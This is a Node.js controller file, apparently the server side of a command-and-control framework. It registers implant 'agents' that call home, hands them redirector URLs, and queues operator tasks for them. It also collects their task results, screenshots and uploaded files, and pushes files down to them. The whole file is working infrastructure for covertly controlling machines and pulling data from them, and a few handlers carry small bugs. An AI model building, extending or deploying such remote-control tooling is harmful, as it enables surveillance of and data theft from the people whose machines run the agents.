/**
 * @file Controller code for the agent-related ops.
 * @author Umar Abdul
 */

import crypto from 'crypto';
import path from 'path';
import fs from 'fs';
import multer from 'multer';
import jimp from 'jimp';
import Agent, * as agentModel from '../models/agent.js';
import Key, * as keyModel from '../models/key.js';
import Task, * as taskModel from '../models/task.js';
import File, * as fileModel from '../models/file.js';
import Redirector, * as rdModel from '../models/redirector.js';
import {logStatus, logWarning, logError} from '../models/log.js';
import {output} from '../lib/utils.js';

// A generic error message for requests that got denied due to perm issues.
const PERM_ERROR = {error: "Permission denied!"};

// Configure multer for file upload.
const orgFilenames = {}; // For temporarily mapping unique file IDs to their original name.

/**
 * Create a new agent. Called when a new agent calls home.
 * Sends an empty JSON to the client when it's unauthorized or a problem occurred.
 */
export const agentInit = async (req, res) => {
  
  const errRsp = {};
  const authKey = req.body.key;
  if (!authKey)
    return res.json(errRsp);
  if (!(await keyModel.authenticate(authKey)))
    return res.json(errRsp);
  agentModel.createAgent(req.body).then(async (data) => {
    const rds = await rdModel.getRedirectors();
    data.config.redirectors = [];
    for (let r of rds)
      data.config.redirectors.push(r.url);
    output(`New agent called home: ${data.config.uid}`);
    return res.json(data.config);
  }).catch(error => {
    return errRsp;
  });
};

/**
 * Used by agents for pinging the server without fetching new tasks.
 * Gives a 200 response if the agent exists in the database.
 */
export const agentPing = async (req, res) => {

  const agentID = req.params.agentID;
  const valid = await Agent.findOne({uid: agentID});
  if (valid)
    return res.json({success: "pong"});
  return res.status(404).json({});
};

/**
 * Get all agents. For authenticated users only.
 */
export const getAgents = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  agentModel.getAgents().then(agents => {
    return res.json(agents);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get an agent with given ID.
 */
export const getAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  agentModel.getAgent(req.params.agentID).then(agent => {
    return req.json(agent);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Create a new task. For authenticated users only.
 */
export const createTask = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  taskModel.createTask(req.session.username, req.body).then(task => {
    return res.json(task);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get all tasks for all agents. For authenticated users only.
 * Should normally be used only once by clients for session setup. Any other update should be through ws
 */
export const getAllTasks = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  taskModel.getAllTasks().then(tasks => {
    return res.json(tasks);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to receive all their queued tasks.
 * Note: It will also mark all the tasks sent as 'received'.
 */
export const getPendingTasks = async (req, res) => {

  try{
    const agentID = req.params.agentID;
    await agentModel.updateLastSeen(agentID);
    const tasks = await taskModel.getPendingTasks(agentID);
    // Mark them as received.
    for (let task of tasks){
      try{
        taskModel.markReceived(task.uid);
      }catch(err){
        console.log(err);
      }
    }
    return res.json(tasks);
  }catch(error){
    return res.json([]);
  };
};

/**
 * Get all the tasks created for a specific agent. For authenticated users only.
 */
export const getTasks = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  taskModel.getTasks(agentID).then(tasks => {
    return res.json(tasks);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to submit the results of their tasks.
 */
export const setTasksResults = async (req, res) => {

  const agentID = req.params.agentID;
  const results = req.body;
  if (!(results && results.length !== 0))
    return res.json({});
  for (let result of results){
    try{
      await taskModel.setResult(agentID, result);
    }catch(error){}
  }
  return res.json({});
};

/**
 * Freeze an active agent.
 */
export const freezeAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  agentModel.freezeAgent(agentID, req.session.username).then(data => {
    return res.json({success: "Agent frozen!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Unfreeze an active agent.
 */
export const unfreezeAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  agentModel.unfreezeAgent(agentID, req.session.username).then(data => {
    return res.json({success: "Agent unfrozen!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Delete an agent.
 */
export const deleteAgent = async (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  try{
    await agentModel.deleteAgent(agentID, req.session.username);
    await taskModel.deleteAllTasks(agentID);
    await fileModel.deleteAllFiles(agentID);
    return res.json({success: "Agent deleted!"});
  }catch(error){
    return res.status(403).json({error: error.message});
  }
};

/**
 * Delete a task.
 */
export const deleteTask = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  taskModel.deleteTask(req.params.agentID, req.params.taskID, req.session.username).then(data => {
    return res.json({success: "Task deleted!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * For obtaining all files for an agent. For logged in users only.
 */
export const getAgentFiles = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  fileModel.getAgentFiles(agentID).then(files => {
    return res.json(files);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Convert an uploaded BMP file to PNG. Used for screenshots.
 * @param {string} bmpFile - Path to the BMP file.
 * @param {string} pngFile - PNG file path to save to.
 */
const convertUploadedBMP = async (bmpFile, pngFile) => {

  return new Promise((resolve, reject) => {
    jimp.read(bmpFile, (err, image) => {
      if (err)
        return reject(err);
      image.write(pngFile, (err) => {
        if (err)
          return reject(err);
        return resolve();
      });
    });
  });
};

/**
 * Used by both agents and operators to upload files to the server.
 */
export const uploadFile = async (req, res) => {
  
  const socketServer = global.socketServer;
  const agentID = req.params.agentID;
  const taskID = req.params.taskID;
  const userUpload = req.session.loggedIn;
  let task = null;
  if (!userUpload){
    // Use task ID to verify if agent upload is for a legitimate and incomplete task.
    task = await Task.findOne({uid: taskID, agentID, completed: false});
    if (!task)
      return res.status(403).json(PERM_ERROR);
  }
  const storage = multer.diskStorage({
    destination: global.UPLOAD_LOCATION,
    filename: (req, file, callback) => {
      let orgName = path.basename(path.resolve(file.originalname)).trim();
      if (orgName.length === 0)
        orgName = "untitled";
      const uid = crypto.randomBytes(16).toString('hex');
      orgFilenames[uid] = orgName;
      callback(null, uid);
    }
  });
  const uploader = multer({
    storage,
    limits: {
      fileSize: global.MAX_UPLOAD_SIZE
    }
  }).single('file');
  agentModel.getAgent(agentID).then(agent => {
    uploader(req, res, async (error) => {
      if (error){
        logError(`Error uploading file: ${error.message}`);
        return res.status(403).json({error: error.message});
      }
      const uid = path.basename(req.file.path);
      let orgName = orgFilenames[uid];
      delete orgFilenames[uid];
      let fileSize = req.file.size;
      if ((!userUpload) && task.taskType === "screenshot"){ // Screenshot BMP uploads need extra processing.
        try{
          fs.renameSync(req.file.path, req.file.path + ".bmp");
          await convertUploadedBMP(req.file.path + ".bmp", req.file.path + ".png");
          fs.renameSync(req.file.path + ".png", req.file.path);
          fs.unlinkSync(req.file.path + ".bmp");
          orgName = `screenshot-${Date.now()}.png`;
          fileSize = fs.statSync(req.file.path).size;
        }catch(err){
          logError(`Error converting uploaded BMP file: ${err.message}`);
          fs.unlinkSync(req.file.path, () => {});
          return res.status(500).json({});
        }
      }
      const file = new File({
        uid,
        agentID: agentID,
        name: orgName,
        size: fileSize,
        downloadsCount: 0,
        dateCreated: Date.now()
      });
      await file.save();
      let msg = userUpload ? (`File received from user '${req.session.username}': ${uid} - ${orgName}`) : (`File received from agent: ${uid} - ${orgName}`);
      global.socketServer.emit("agent_console_output", {
        agentID: agentID.toString(),
        prompt: global.serverPrompt,
        msg
      });
      global.socketServer.emit("new_file", file);
      // Task agent to download the file if user is the one uploading.
      if (userUpload){
        logStatus(`File '${uid}' uploaded by user '${req.session.username}' for agent '${agentID}'`)
        const task = {
          agentID: agentID.toString(),
          taskType: "upload",
          data: {
            "fileID": uid,
            "name": orgName
          }
        }
        taskModel.createTask(req.session.username, task);
      }else{
        logStatus(`File '${uid}' uploaded by agent '${agentID}'`);
      }
      return res.json({success: "File uploaded!"});
    });
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Re-upload a file to an agent by creating a new upload task with an existing file.
 */
export const reuploadFile = async (req, res) => {

  if (!req.session.loggedIn)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  const fileID = req.params.fileID;
  const file = await File.findOne({uid: fileID});
  if (!file)
    return res.status(404).json({error: "Invalid file!"});
  taskModel.createTask(req.session.username, {
    agentID,
    taskType: "upload",
    data: {
      fileID,
      name: file.name
    }
  }).then(data => {
    return res.json({success: "Upload task created successfully!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Download a file using it's ID. Used by both operators and agents.
 */
export const downloadFile = async (req, res) => {

  const fileID = req.params.fileID;
  const file = await File.findOne({uid: fileID});
  if (!file)
    return res.status(404).json({error: "Invalid file!"});
  res.download(`${path.join(global.UPLOAD_LOCATION, file.uid)}`, file.name, async (err) => {
    if (err){
      console.log(err);
    }else{
      file.downloadsCount++;
      await file.save();
      global.socketServer.emit("file_updated", file);
    }
  });
};

/**
 * Delete an uploaded file.
 */
export const deleteFile = (req, res) => {

  if (!req.session.loggedIn)
    return res.status(403).json(PERM_ERROR);
  const agentID = req.params.agentID;
  const fileID = req.params.fileID;
  fileModel.deleteFile(agentID, fileID).then(data => {
    logWarning(`File '${fileID}' deleted by '${req.session.username}'`);
    global.socketServer.emit("file_deleted", fileID);
    return res.json({success: "File deleted!"});
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};
